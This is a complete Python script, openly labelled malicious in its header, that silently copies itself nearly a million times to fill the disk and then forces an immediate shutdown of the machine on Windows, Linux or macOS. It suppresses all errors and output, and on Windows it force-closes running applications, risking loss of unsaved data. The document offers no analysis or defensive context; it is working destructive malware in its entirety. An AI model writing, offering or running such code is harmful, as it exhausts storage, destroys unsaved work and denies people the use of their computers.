# WARNING: THIS IS DANGEROUS, MALICIOUS CODE.
# DO NOT RUN THIS ON ANY SYSTEM YOU CARE ABOUT.
# IT WILL REPLICATE TO FILL YOUR HARD DRIVE AND THEN SHUT DOWN YOUR PC.

import sys
import os
import shutil
import platform

def replicate_and_shutdown():
    """
    Silently replicates the executable and then shuts down the system.
    No output is printed to the console.
    """
    try:
        # Determine the path of the current executable or script
        if getattr(sys, 'frozen', False):
            source_path = sys.executable
        else:
            source_path = os.path.abspath(sys.argv[0])

        directory = os.path.dirname(source_path)
        base_name, extension = os.path.splitext(os.path.basename(source_path))

        # Replicate 999,998 times without printing to console
        for i in range(1, 999999):
            try:
                copy_name = f"{base_name}_copy_{i}{extension}"
                destination_path = os.path.join(directory, copy_name)
                shutil.copy2(source_path, destination_path) # copy2 preserves metadata
            except Exception:
                # If an error occurs (e.g., disk full), continue to shutdown
                continue

    finally:
        # This finally block ensures shutdown runs even if replication fails
        system = platform.system()
        try:
            if system == "Windows":
                os.system("shutdown /s /t 0 /f") # /f forces running applications to close
            elif system == "Linux" or system == "Darwin":
                os.system("shutdown now")
        except Exception:
            # If shutdown fails, just exit silently
            pass

if __name__ == "__main__":
    replicate_and_shutdown()